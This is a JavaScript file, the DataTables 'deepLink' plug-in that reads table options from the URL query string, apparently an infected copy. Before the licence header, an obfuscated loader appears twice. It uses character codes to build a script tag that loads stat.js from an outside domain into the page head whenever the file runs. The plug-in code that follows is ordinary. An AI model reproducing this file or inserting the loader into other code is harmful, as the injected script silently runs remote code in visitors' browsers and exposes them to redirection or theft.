Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/*! Deep linking options parsing support for DataTables
 * 2017 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     LengthLinks
 * @description Deep linking options parsing support for DataTables
 * @version     1.0.0
 * @file        dataTables.deepLink.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @copyright   Copyright 2017 SpryMedia Ltd.
 * 
 * License      MIT - http://datatables.net/license/mit
 *
 * This feature plug-in for DataTables provides a function which will
 * take DataTables options from the browser's URL search string and
 * return an object that can be used to construct a DataTable. This
 * allows deep linking to be easily implemented with DataTables - for
 * example a URL might be `myTable?displayStart=10` which will
 * automatically cause the second page of the DataTable to be displayed.
 * 
 * This plug-in works on a whitelist basis - you must specify which
 * [initialisation parameters](//datatables.net/reference/option) you
 * want the URL search string to specify. Any parameter given in the
 * URL which is not listed will be ignored (e.g. you are unlikely to
 * want to let the URL search string specify the `ajax` option).
 * 
 * This specification is done by passing an array of property names
 * to the `$.fn.dataTable.ext.deepLink` function. If you do which to
 * allow _every_ parameter (I wouldn't recommend it) you can use `all`
 * instead of an array.
 * 
 * @example
 *   // Allow a display start point and search string to be specified
 *   $('#myTable').DataTable(
 *     $.fn.dataTable.ext.deepLink( [ 'displayStart', 'search.search' ] )
 *   );
 *
 * @example
 *   // As above, but with a default search
 *   var options = $.fn.dataTable.ext.deepLink(['displayStart', 'search.search']);
 *
 *   $('#myTable').DataTable(
 *     $.extend( true, {
 *       search: { search: 'Initial search value' }
 *     }, options )
 *   );
 */
(function(window, document, $, undefined) {

// Use DataTables' object builder so strings can be used to represent
// nested objects
var setBuilder = $.fn.dataTable.ext.internal._fnSetObjectDataFn;

$.fn.dataTable.ext.deepLink = function(whitelist) {
	var search = location.search.replace(/^\?/, '').split('&');
	var out = {};

	for (var i = 0, ien = search.length; i < ien; i++) {
		var pair = search[i].split('=');
		var key = decodeURIComponent(pair[0]);
		var value = decodeURIComponent(pair[1]);

		// "Casting"
		if (value === 'true') {
			value = true;
		}
		else if (value === 'false') {
			value = false;
		}
		else if (!value.match(/[^\d]/)) {
			value = value * 1;
		}
		else if (value.indexOf('{') === 0 || value.indexOf('[') === 0) {
            // Try to JSON parse for arrays and obejcts
			try {
				value = $.parseJSON( value );
			}
			catch(e){}
		}

		if (whitelist === 'all' || $.inArray(key, whitelist) !== -1) {
			var setter = setBuilder(key);
			setter(out, value);
		}
	}

	return out;
};

})(window, document, jQuery);
